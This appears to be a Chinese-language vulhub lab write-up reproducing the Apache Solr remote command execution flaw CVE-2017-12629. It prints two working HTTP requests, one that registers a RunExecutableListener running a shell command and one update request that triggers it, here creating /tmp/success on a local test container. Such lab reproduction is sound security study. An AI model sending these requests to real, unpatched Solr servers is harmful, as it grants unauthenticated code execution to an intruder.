# Apache Solr 远程命令执行漏洞（CVE-2017-12629）

###### by ADummy

### 0x00利用路线

​			Burpsuite发送两个包，一个listener，一个update--->命令执行

### 0x01漏洞介绍			

​			Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：[XML实体扩展漏洞（XXE）](https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-XXE)和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。

##### 影响版本

```
Apache Solr < 7.1.0
```

### 0x02漏洞复现

访问`http://your-ip:8983/`即可查看到Apache solr的管理页面，无需登录。

![Apache_Solr_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Apache_Solr_RCE_1.jpg)

首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数：

```
POST /solr/demo/config HTTP/1.1
Host: your-ip
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 158

{"add-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "touch /tmp/success"]}}
```

![Apache_Solr_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Apache_Solr_RCE_2.jpg)

然后进行update操作，触发刚才添加的listener：

```
POST /solr/demo/update HTTP/1.1
Host: your-ip
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 15

[{"id":"test"}]
```

![Apache_Solr_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Apache_Solr_RCE_3.jpg)

进入容器，查看success已经创建

![Apache_Solr_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Apache_Solr_RCE_4.jpg)

